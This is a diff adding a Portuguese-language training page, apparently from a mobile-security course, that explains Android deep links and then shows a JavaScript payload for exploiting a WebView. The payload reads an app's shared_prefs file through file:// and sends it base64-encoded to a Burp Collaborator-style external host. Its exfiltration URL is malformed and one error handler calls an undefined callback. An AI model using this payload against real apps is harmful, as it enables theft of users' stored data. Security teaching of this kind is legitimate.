@@ -1,0 +1,54 @@
+export const metadata = {
+  title: 'Vulnerabilidades: Deep Link',
+  innerTitle: 'Deep Link',
+  canary: true
+}
+
+> [!CANARY]
+> Essa é uma versão inicial, e pode conter erros ou informações desatualizadas. O conteúdo está em desenvolvimento e será atualizado conforme necessário.
+
+## O que é Deep Link?
+Deep linking é uma técnica que permite que URLs específicas dentro de um aplicativo sejam acessadas diretamente, em vez de apenas abrir a tela inicial do aplicativo. Isso é útil para direcionar usuários a conteúdos específicos, como produtos, artigos ou perfis de usuário.
+
+```xml filename="AndroidManifest.xml" showLineNumbers highlight={6}
+<intent-filter ...>
+    <action android:name="android.intent.action.VIEW" />
+    <category android:name="android.intent.category.DEFAULT" />
+    <category android:name="android.intent.category.BROWSABLE" />
+    
+    <data android:scheme="hackingforce" android:host="training" />
+</intent-filter>
+```
+
+## Explorando WebView's
+
+```javascript filename="webview.js" showLineNumbers
+function exfiltrateFile(filePath, callback) {
+  const request = new XMLHttpRequest();
+  
+  request.open("GET", "file://" + filePath, true);
+  request.onload = function(event) {
+    callback(btoa(request.responseText));
+  }
+  request.onerror = function(event) {
+    document.write(event);
+    callback(null);
+  }
+  request.send();
+}
+const FILE_PATH = "/data/user/0/com.insecureshop/shared_prefs/Prefs.xml";
+
+exfiltrateFile(FILE_PATH, (contents) => {
+  const exfil = new XMLHttpRequest();
+  
+  exfil.open("GET", " < https: //burpcolloboratorurl.com?file=>" + contents, true);
+  exfil.onload = function(event) {
+    document.write(" < /br>[+] File successfully exfiltrated to remote server");
+  }
+  exfil.onerror = function(event) {
+    document.write(event);
+    callback(null);
+  }
+  exfil.send();
+});
+```
